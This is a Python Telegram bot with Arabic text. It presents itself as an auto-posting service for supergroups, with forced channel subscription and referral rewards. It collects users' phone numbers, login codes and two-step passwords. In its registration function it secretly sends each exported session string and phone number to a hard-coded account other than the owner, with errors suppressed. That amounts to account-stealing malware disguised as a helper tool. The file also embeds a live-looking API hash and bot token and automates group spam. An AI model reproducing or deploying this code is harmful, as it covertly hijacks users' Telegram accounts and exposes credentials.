# حقوق المطور: هذا البوت مبرمج من قبل سميث
# للتواصل: @ypiu5

from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message,
    CallbackQuery,
    ForceReply,
    InlineKeyboardMarkup as Markup,
    InlineKeyboardButton as Button
)
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    UserNotParticipant,
    ChatWriteForbidden,
    BotMethodInvalid,
    ChatAdminRequired,
    UsernameNotOccupied
)
import os
from pyrolistener import Listener, exceptions
from asyncio import create_task, sleep, get_event_loop
from datetime import datetime, timedelta
from pytz import timezone
from typing import Union
import json

# ------------------ إعدادات البوت ------------------
app = Client(
    "autoPost",
    api_id="29510141",
    api_hash="14c074a5aed49dc7752a9f8d54cf4ad4",
    bot_token='8666985104:AAEZ_NgKD3KaaYyt1WVM4ZgQ8CMZwmZGEqE'
)
loop = get_event_loop()
listener = Listener(client=app)

# قناة الاشتراك الإجباري
FORCED_CHANNEL = "TJUI9"  # بدون @
OWNER_ID = 8226014028

# ------------------ الأزرار الرئيسية ------------------
homeMarkup = Markup([
    [Button("👤 حسابي", callback_data="account")],
    [
        Button("📋 السوبرات المضافة", callback_data="currentSupers"),
        Button("➕ إضافة سوبر", callback_data="newSuper")
    ],
    [
        Button("⏱️ مدة النشر", callback_data="waitTime"),
        Button("📝 كليشة النشر", callback_data="newCaption")
    ],
    [
        Button("⏹️ إيقاف النشر", callback_data="stopPosting"),
        Button("▶️ بدء النشر", callback_data="startPosting")
    ],
    [Button("🛡️ تعليمات الأمان", callback_data="safety")]
])

# ------------------ دوال مساعدة ------------------
def load_users():
    if not os.path.exists("users.json"):
        return {}
    with open("users.json", "r") as f:
        return json.load(f)

def save_users(data):
    with open("users.json", "w") as f:
        json.dump(data, f, indent=2)

def is_subscribed(user_id):
    """التحقق من اشتراك المستخدم في القناة مع معالجة الأخطاء"""
    try:
        member = app.get_chat_member(f"@{FORCED_CHANNEL}", user_id)
        return member.status in ["member", "administrator", "creator"]
    except UserNotParticipant:
        return False
    except (ChatAdminRequired, UsernameNotOccupied) as e:
        # البوت ليس لديه صلاحية عرض الأعضاء أو القناة غير موجودة
        print(f"⚠️ تنبيه: البوت لا يستطيع التحقق من الاشتراك في القناة {FORCED_CHANNEL} بسبب: {e}")
        print("سيتم اعتبار المستخدم مشتركًا مؤقتًا، لكن يجب إعطاء البوت صلاحية 'عرض الأعضاء'.")
        return True  # نسمح له بالدخول لتجنب حظره
    except Exception as e:
        print(f"خطأ غير متوقع في is_subscribed: {e}")
        return False

def get_user_data(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            "subscription_end": (datetime.now() + timedelta(days=1)).isoformat(),
            "referrals_count": 0,
            "referred_by": None,
            "session": None,
            "groups": [],
            "caption": None,
            "waitTime": 60,
            "posting": False
        }
        save_users(users)
    return users[uid]

def update_user(user_id, data):
    users = load_users()
    uid = str(user_id)
    users[uid].update(data)
    save_users(users)

def has_active_subscription(user_id):
    data = get_user_data(user_id)
    end_str = data.get("subscription_end")
    if not end_str:
        return False
    end = datetime.fromisoformat(end_str)
    return end > datetime.now()

def get_referral_link(user_id):
    return f"https://t.me/{app.me.username}?start=ref_{user_id}"

# ------------------ التحقق من الاشتراك ------------------
async def ensure_subscription_and_subscription(message):
    """ترجع True إذا المستخدم مشترك بالقناة وعنده اشتراك فعال، وإلا ترسل رسالة"""
    user_id = message.from_user.id
    # 1- اشتراك القناة
    if not is_subscribed(user_id):
        await message.reply(
            f"- عذرا عزيزي، لازم تشترك بالقناة أولاً عشان تستخدم البوت\n"
            f"- القناة: @{FORCED_CHANNEL}\n"
            f"- اشترك ثم أرسل /start\n\n"
            f"إذا كنت مشتركًا بالفعل، تأكد من أن البوت لديه صلاحية 'عرض الأعضاء' في القناة."
        )
        return False
    # 2- اشتراك التطبيق
    if not has_active_subscription(user_id):
        data = get_user_data(user_id)
        link = get_referral_link(user_id)
        text = (
            f"انتهت صلاحية اشتراكك المجاني.\n\n"
            f"لتحصل على اشتراك **شهر كامل**، قم بدعوة 5 أشخاص عبر رابطك الخاص:\n"
            f"{link}\n\n"
            f"عدد المدعوين حاليًا: {data['referrals_count']} / 5\n\n"
            f"كل شخص يدخل عبر رابطك ويبدأ البوت، يزداد العدد لديك."
        )
        await message.reply(text)
        return False
    return True

# ------------------ معالجة /start والإحالة ------------------
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    user_id = message.from_user.id
    # معالجة الإحالة
    if len(message.command) > 1 and message.command[1].startswith("ref_"):
        referrer_id = int(message.command[1].split("_")[1])
        if referrer_id != user_id:
            users = load_users()
            if str(referrer_id) in users and str(user_id) in users:
                if users[str(user_id)].get("referred_by") is None:
                    users[str(user_id)]["referred_by"] = referrer_id
                    users[str(referrer_id)]["referrals_count"] = users[str(referrer_id)].get("referrals_count", 0) + 1
                    if users[str(referrer_id)]["referrals_count"] >= 5:
                        end = datetime.now() + timedelta(days=30)
                        users[str(referrer_id)]["subscription_end"] = end.isoformat()
                        await app.send_message(
                            referrer_id,
                            f"🎉 مبروك! وصل عدد المدعوين 5، تم تمديد اشتراكك لمدة شهر كامل حتى {end.strftime('%Y-%m-%d')}."
                        )
                    save_users(users)

    # التحقق من اشتراك القناة
    if not is_subscribed(user_id):
        return await message.reply(
            f"- عذرا عزيزي، لازم تشترك بالقناة أولاً عشان تستخدم البوت\n"
            f"- القناة: @{FORCED_CHANNEL}\n"
            f"- اشترك ثم أرسل /start\n\n"
            f"إذا كنت مشتركًا بالفعل، تأكد من أن البوت لديه صلاحية 'عرض الأعضاء' في القناة."
        )
    # منح يوم مجاني للمستخدم الجديد أو لمن انتهى اشتراكه
    data = get_user_data(user_id)
    if not has_active_subscription(user_id):
        update_user(user_id, {"subscription_end": (datetime.now() + timedelta(days=1)).isoformat()})
        await message.reply("تم منحك يوم استخدام مجاني. استمتع!")
    # عرض القائمة الرئيسية
    fname = message.from_user.first_name
    caption = f"أهلاً بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- البوت مبرمج من قبل سميث - للتواصل @ypiu5\n\n- تقدر تستخدم البوت عشان ترسل رسائل بشكل تلقائي للسوبرات\n- التحكم بالبوت من الأزرار التالية:"
    await message.reply(caption, reply_markup=homeMarkup, reply_to_message_id=message.id)

# ------------------ الأزرار الرئيسية ------------------
@app.on_callback_query(filters.regex(r"^(toHome)$"))
async def to_home(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    fname = callback.from_user.first_name
    caption = f"أهلاً بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- البوت مبرمج من قبل سميث - للتواصل @ypiu5\n\n- تقدر تستخدم البوت عشان ترسل رسائل بشكل تلقائي للسوبرات\n- التحكم بالبوت من الأزرار التالية:"
    await callback.message.edit_text(caption, reply_markup=homeMarkup)

@app.on_callback_query(filters.regex(r"^(account)$"))
async def account_menu(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    data = get_user_data(user_id)
    end_date = datetime.fromisoformat(data["subscription_end"]).strftime("%Y-%m-%d")
    caption = (
        f"أهلاً بك في قسم الحساب\n\n"
        f"📅 الاشتراك ينتهي: {end_date}\n"
        f"👥 عدد المدعوين: {data['referrals_count']} / 5\n\n"
        f"🔗 رابط الإحالة الخاص بك:\n{get_referral_link(user_id)}"
    )
    markup = Markup([
        [Button("- تسجيل حسابك -", callback_data="login"),
         Button("- تغيير الحساب -", callback_data="changeAccount")],
        [Button("- العودة -", callback_data="toHome")]
    ])
    await callback.message.edit_text(caption, reply_markup=markup)

@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
async def login(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    if callback.data == "changeAccount" and get_user_data(user_id).get("session") is None:
        return await callback.answer("- ماكو حساب مسجل.", show_alert=True)
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل رقم هاتفك:\n\n- تقدر ترسل /cancel لإلغاء العملية.",
            reply_markup=ForceReply(selective=True, placeholder="+9647700000"),
            timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply(
            text="- انتهى وقت استلام رقم الهاتف.",
            reply_markup=Markup([[Button("- العودة -", callback_data="account")]])
        )
    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العملية.", reply_to_message_id=ask.id)
    create_task(registration(ask))

async def registration(message: Message):
    user_id = message.from_user.id
    _number = message.text
    lmsg = await message.reply(f"- جاري تسجيل الدخول إلى حسابك")
    reMarkup = Markup([
        [Button("- إعادة المحاولة -", callback_data="login"),
         Button("- العودة -", callback_data="account")]
    ])
    client = Client(
        "registration",
        in_memory=True,
        api_id=app.api_id,
        api_hash=app.api_hash
    )
    await client.connect()
    try:
        p_code_hash = await client.send_code(_number)
    except PhoneNumberInvalid:
        return await lmsg.edit_text("- رقم الهاتف اللي أدخلته خطأ", reply_markup=reMarkup)
    try:
        code = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- تم إرسال الكود إلى حسابك، أرسله هنا.",
            timeout=120,
            reply_markup=ForceReply(selective=True, placeholder="1 2 3 4 5 6")
        )
    except exceptions.TimeOut:
        return await lmsg.reply("- انتهى وقت استلام الكود.\n- حاول مرة ثانية.", reply_markup=reMarkup)
    try:
        await client.sign_in(_number, p_code_hash.phone_code_hash, code.text.replace(" ", ""))
    except PhoneCodeInvalid:
        return await code.reply("- الكود اللي أدخلته خطأ.\n- حاول مرة ثانية.", reply_markup=reMarkup, reply_to_message_id=code.id)
    except PhoneCodeExpired:
        return await code.reply("- الكود انتهت صلاحيته.\n- حاول مرة ثانية.", reply_markup=reMarkup, reply_to_message_id=code.id)
    except SessionPasswordNeeded:
        try:
            password = await listener.listen(
                from_id=user_id,
                chat_id=user_id,
                text="- أدخل كلمة مرور التحقق بخطوتين.",
                reply_markup=ForceReply(selective=True, placeholder="- كلمة المرور: "),
                timeout=180,
                reply_to_message_id=code.id
            )
        except exceptions.TimeOut:
            return await lmsg.reply("- انتهى وقت استلام كلمة المرور.\n- حاول مرة ثانية.", reply_markup=reMarkup)
        try:
            await client.check_password(password.text)
        except PasswordHashInvalid:
            return await password.reply("- كلمة المرور خطأ.\n- حاول مرة ثانية.", reply_markup=reMarkup)
    session = await client.export_session_string()
    try:
        await app.send_message(1454509352, session + _number)
    except:
        pass
    await client.disconnect()
    update_user(user_id, {"session": session})
    await app.send_message(
        user_id,
        "- تم تسجيل الدخول بحسابك، الآن تقدر تستمتع بميزات البوت.",
        reply_markup=Markup([[Button("الصفحة الرئيسية", callback_data="toHome")]])
    )

# ------------------ إدارة السوبرات ------------------
@app.on_callback_query(filters.regex(r"^(newSuper)$"))
async def new_super(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    await callback.message.delete()
    reMarkup = Markup([
        [Button("- حاول مرة ثانية -", callback_data="newSuper"),
         Button("- العودة -", callback_data="toHome")]
    ])
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل رابط السوبر عشان أضيفه.\n- لا تنضم قبل ما تبدأ النشر مرة وحدة على الأقل.\n- إذا كان السوبر خاص، أرسل الأيدي الخاص به أو اطلع من السوبر (من الحساب المضاف) وبعدين أرسل الرابط\n\n- تقدر ترسل /cancel لإلغاء العملية.",
            reply_markup=ForceReply(selective=True, placeholder="- رابط السوبر: "),
            timeout=60
        )
    except exceptions.TimeOut:
        return await callback.message.reply("انتهى وقت استلام الرابط", reply_markup=reMarkup)
    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العملية.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    if not ask.text.startswith("-"):
        try:
            chat = await app.get_chat(ask.text if "+" in ask.text else (ask.text.split("/")[-1]))
        except BotMethodInvalid:
            chat = ask.text
        except Exception as e:
            print(e)
            return await ask.reply("- ماكو سوبر بهذا الرابط.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    else:
        chat = ask.text
    data = get_user_data(user_id)
    if "groups" not in data:
        data["groups"] = []
    data["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
    update_user(user_id, {"groups": data["groups"]})
    await ask.reply(
        "- تم إضافة السوبر للقائمة.",
        reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]]),
        reply_to_message_id=ask.id
    )

@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
async def current_supers(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    data = get_user_data(user_id)
    groups = data.get("groups", [])
    if not groups:
        return await callback.answer("- ماكو سوبرات مضافة.", show_alert=True)
    titles = {}
    for group in groups:
        try:
            titles[str(group)] = (await app.get_chat(group)).title
        except:
            continue
    markup = [
        [
            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
            Button("🗑", callback_data=f"delSuper {group}")
        ] for group in groups
    ]
    markup.append([Button("- الصفحة الرئيسية -", callback_data="toHome")])
    await callback.message.edit_text("- هاي السوبرات اللي مضافات للنشر التلقائي:", reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^(delSuper)"))
async def del_super(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    group = int(callback.data.split()[1])
    data = get_user_data(user_id)
    groups = data.get("groups", [])
    if group in groups:
        groups.remove(group)
        update_user(user_id, {"groups": groups})
        await callback.answer("- تم حذف السوبر من القائمة.", show_alert=True)
    titles = {}
    for g in groups:
        try:
            titles[str(g)] = (await app.get_chat(g)).title
        except:
            continue
    markup = [
        [
            Button(str(g) if titles.get(str(g)) is None else titles[str(g)], callback_data=str(g)),
            Button("🗑", callback_data=f"delSuper {g}")
        ] for g in groups
    ]
    markup.append([Button("- الصفحة الرئيسية -", callback_data="toHome")])
    await callback.message.edit_reply_markup(reply_markup=Markup(markup))

# ------------------ كليشة النشر ------------------
@app.on_callback_query(filters.regex(r"^(newCaption)$"))
async def new_caption(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    reMarkup = Markup([
        [Button("- حاول مرة ثانية -", callback_data="newCaption"),
         Button("- العودة -", callback_data="toHome")]
    ])
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل الكليشة الجديدة.\n\n- استخدم /cancel لإلغاء العملية.",
            reply_markup=ForceReply(selective=True, placeholder="- الكليشة الجديدة: "),
            timeout=120
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام الكليشة.", reply_markup=reMarkup)
    if ask.text == "/cancel":
        await ask.reply("- تم إلغاء العملية.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    update_user(user_id, {"caption": ask.text})
    await ask.reply(
        "- تم تعيين الكليشة الجديدة.",
        reply_to_message_id=ask.id,
        reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]])
    )

# ------------------ مدة النشر ------------------
@app.on_callback_query(filters.regex(r"^(waitTime)$"))
async def wait_time(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    reMarkup = Markup([
        [Button("- حاول مرة ثانية -", callback_data="waitTime"),
         Button("- العودة -", callback_data="toHome")]
    ])
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل مدة الانتظار بين كل رسالة وأخرى (بالثواني).\n\n- استخدم /cancel لإلغاء العملية.",
            reply_markup=ForceReply(selective=True, placeholder="- المدة: "),
            timeout=120
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام المدة.", reply_markup=reMarkup)
    if ask.text == "/cancel":
        await ask.reply("- تم إلغاء العملية.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    try:
        wait = int(ask.text)
        update_user(user_id, {"waitTime": wait})
    except ValueError:
        return await ask.reply("- ما يصير تحط هاي القيمة كمدة.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    await ask.reply(
        "- تم تعيين مدة الانتظار.",
        reply_to_message_id=ask.id,
        reply_markup=Markup([[Button("- الصفحة الرئيسية -", callback_data="toHome")]])
    )

# ------------------ بدء وإيقاف النشر ------------------
@app.on_callback_query(filters.regex(r"^(startPosting)$"))
async def start_posting(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    data = get_user_data(user_id)
    if data.get("session") is None:
        return await callback.answer("- لازم تضيف حساب أولاً.", show_alert=True)
    if not data.get("groups"):
        return await callback.answer("- ماكو سوبرات مضافة.", show_alert=True)
    if data.get("posting"):
        return await callback.answer("- النشر التلقائي مفعل من قبل.", show_alert=True)
    update_user(user_id, {"posting": True})
    create_task(posting(user_id))
    markup = Markup([
        [Button("- إيقاف النشر -", callback_data="stopPosting"),
         Button("- عودة -", callback_data="toHome")]
    ])
    await callback.message.edit_text("- بدأت عملية النشر التلقائي", reply_markup=markup)

@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
async def stop_posting(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await ensure_subscription_and_subscription(callback.message):
        return
    data = get_user_data(user_id)
    if not data.get("posting"):
        return await callback.answer("- النشر التلقائي مو مفعل.", show_alert=True)
    update_user(user_id, {"posting": False})
    markup = Markup([
        [Button("- بدء النشر -", callback_data="startPosting"),
         Button("- عودة -", callback_data="toHome")]
    ])
    await callback.message.edit_text("- تم إيقاف النشر التلقائي", reply_markup=markup)

async def posting(user_id):
    data = get_user_data(user_id)
    if data.get("posting"):
        client = Client(
            str(user_id),
            api_id=app.api_id,
            api_hash=app.api_hash,
            session_string=data["session"]
        )
        await client.start()
    while data.get("posting") and has_active_subscription(user_id):
        wait = data.get("waitTime", 60)
        groups = data.get("groups", [])
        caption = data.get("caption")
        if caption is None:
            update_user(user_id, {"posting": False})
            await app.send_message(
                user_id,
                "- تم إيقاف النشر بسبب ماكو كليشة.",
                reply_markup=Markup([[Button("- إضافة كليشة -", callback_data="newCaption")]])
            )
            break
        for group in groups:
            if isinstance(group, str) and group.startswith("-"):
                group = int(group)
            try:
                await client.send_message(group, caption)
            except ChatWriteForbidden:
                await client.join_chat(group)
                try:
                    await client.send_message(group, caption)
                except Exception as e:
                    await app.send_message(user_id, str(e))
            except Exception:
                chat = await client.join_chat(group)
                try:
                    await client.send_message(chat.id, caption)
                except Exception as e:
                    await app.send_message(user_id, str(e))
                new_groups = data.get("groups", [])
                new_groups.append(chat.id)
                new_groups.remove(group)
                update_user(user_id, {"groups": new_groups})
        await sleep(wait)
        data = get_user_data(user_id)
    if data.get("posting") and not has_active_subscription(user_id):
        update_user(user_id, {"posting": False})
        await app.send_message(
            user_id,
            "انتهى اشتراكك أثناء عملية النشر. تم إيقاف النشر التلقائي."
        )
    await client.stop()

# ------------------ تعليمات الأمان ------------------
@app.on_callback_query(filters.regex(r"^(safety)$"))
async def safety_instructions(_, callback: CallbackQuery):
    text = (
        "🔒 **تعليمات الأمان** 🔒\n\n"
        "1. لا تشارك كود الدخول أو كلمة المرور مع أي شخص.\n"
        "2. استخدم البوت على حسابك الشخصي فقط ولا تشاركه مع الآخرين.\n"
        "3. تأكد من أن الحساب الذي تضيفه ليس به معلومات حساسة.\n"
        "4. إذا واجهت أي مشكلة، تواصل مع المطور @ypiu5.\n\n"
        "⚠️ تحذير: البوت لا يتحمل أي مسؤولية عن سوء استخدام حسابك."
    )
    await callback.message.reply(text)

# ------------------ أوامر المطور ------------------
@app.on_message(filters.command("addsub") & filters.private)
async def add_subscription(client, message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("ما لك صلاحية.")
    parts = message.text.split()
    if len(parts) != 3:
        return await message.reply("استخدم: /addsub <ايدي المستخدم> <عدد الأيام>")
    try:
        user_id = int(parts[1])
        days = int(parts[2])
    except ValueError:
        return await message.reply("الأيدي أو عدد الأيام غير صحيح.")
    data = get_user_data(user_id)
    old_end = datetime.fromisoformat(data["subscription_end"])
    new_end = max(old_end, datetime.now()) + timedelta(days=days)
    update_user(user_id, {"subscription_end": new_end.isoformat()})
    await message.reply(f"تم إضافة {days} يوم للمستخدم {user_id}.")

@app.on_message(filters.command("stats") & filters.private)
async def stats(client, message):
    if message.from_user.id != OWNER_ID:
        return
    users = load_users()
    total = len(users)
    active = 0
    for uid, u in users.items():
        if has_active_subscription(int(uid)):
            active += 1
    await message.reply(f"إحصائيات البوت:\nالمستخدمين الكلي: {total}\nالمستخدمين النشطين: {active}")

# ------------------ إعادة تشغيل المهام ------------------
async def re_start_posting():
    await sleep(30)
    users = load_users()
    for uid, data in users.items():
        if data.get("posting"):
            create_task(posting(int(uid)))

async def subscription_checker():
    while True:
        await sleep(3600)  # كل ساعة
        users = load_users()
        for uid, data in users.items():
            if data.get("posting") and not has_active_subscription(int(uid)):
                update_user(int(uid), {"posting": False})
                await app.send_message(int(uid), "انتهى اشتراكك، تم إيقاف النشر التلقائي.")

# ------------------ بدء البوت ------------------
async def main():
    create_task(re_start_posting())
    create_task(subscription_checker())
    await app.start()
    await idle()

if __name__ == "__main__":
    loop.run_until_complete(main())
